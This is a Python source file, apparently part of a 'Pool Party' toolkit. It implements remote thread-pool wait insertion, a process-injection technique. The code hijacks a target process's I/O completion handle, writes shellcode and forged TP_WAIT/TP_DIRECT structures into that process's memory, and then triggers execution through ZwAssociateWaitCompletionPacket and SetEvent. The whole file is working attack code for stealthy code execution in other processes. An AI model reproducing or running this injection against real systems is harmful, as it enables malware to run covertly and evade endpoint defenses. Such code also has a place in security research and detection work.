from pool_party import *
from write_shellcode import *

class RemoteTPWaitInsertion(PoolParty):
    def __init__(self, process_name):
        super().__init__(process_name)
        self.process_handle = HANDLE(0)
        self.handle_io_completion = HANDLE(0)
        self.shellcode_address = 0

    def hijack(self):
        self.handle_io_completion = self.hijack_process_handle(IO_COMPLETION_OBJECT_NAME,
                                                               ULONG(IO_COMPLETION_ALL_ACCESS))
        return True

    def write_shellcode_to_pool(self):
        self.shellcode_address = write_shellcode(self.process_handle)
        return True

    def setup_execute(self):
        tp_wait = CreateThreadpoolWait(self.shellcode_address, LPVOID(0), LPVOID(0))
        if tp_wait is None:
            logging.error("[-] CreateThreadpoolWait failed with error code %d" % GetLastError())
            return False

        direct_address = ctypes.cast(tp_wait, ctypes.c_void_p).value + OFFSET_TPWAIT_DIRECT
        remote_tp_wait = VirtualAllocEx(self.process_handle, LPVOID(0), SIZE_OF_FULL_TP_WAIT_STRUCT,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_READWRITE)
        if remote_tp_wait is None:
            logging.error("[-] VirtualAllocEx for remote_tp_wait struct failed with error code %d" % GetLastError())
            return False

        if not WriteProcessMemory(self.process_handle, remote_tp_wait, ctypes.cast(tp_wait, LPVOID),
                                  SIZE_OF_FULL_TP_WAIT_STRUCT, None):
            logging.error("[-] WriteProcessMemory for remote_tp_wait struct failed with error code %d" % GetLastError())
            return False

        remote_tp_direct = VirtualAllocEx(self.process_handle, LPVOID(0), SIZE_OF_TP_DIRECT_STRUCT,
                                          MEM_COMMIT | MEM_RESERVE,
                                          PAGE_READWRITE)
        if remote_tp_direct is None:
            logging.error("[-] VirtualAllocEx for remote_tp_direct struct failed with error code %d" % GetLastError())
            return False

        byte_written = ctypes.c_size_t(0)

        if not WriteProcessMemory(self.process_handle, remote_tp_direct, LPCVOID(direct_address), SIZE_OF_TP_DIRECT_STRUCT, POINTER(c_size_t)(byte_written)):
            logging.error("[-] WriteProcessMemory for remote_tp_direct struct failed with error code %d" % GetLastError())
            return False

        print(byte_written)

        handle_event = CreateEventW(HANDLE(0), False, False, LPCWSTR("PoolPartyEvent\0"))
        if handle_event is None:
            logging.error("[-] CreateEventW failed with error code %d" % GetLastError())
            return False

        wait_pkt_handle = convert_buffer_to_struct(tp_wait, HANDLE, OFFSET_TPWAIT_WAITPKT)

        nt_status = ZwAssociateWaitCompletionPacket(wait_pkt_handle, self.handle_io_completion, handle_event, remote_tp_direct, remote_tp_wait, 0, 0, None)
        if nt_status != 0:
            logging.error("ZwAssociateWaitCompletionPacket failed with NTSTATUS 0x{:x}".format(nt_status))
            return False

        if not SetEvent(handle_event):
            logging.error("SetEvent Failed with error code %d" % GetLastError())
            return False

        logging.info("[+] Executing shellcode....")


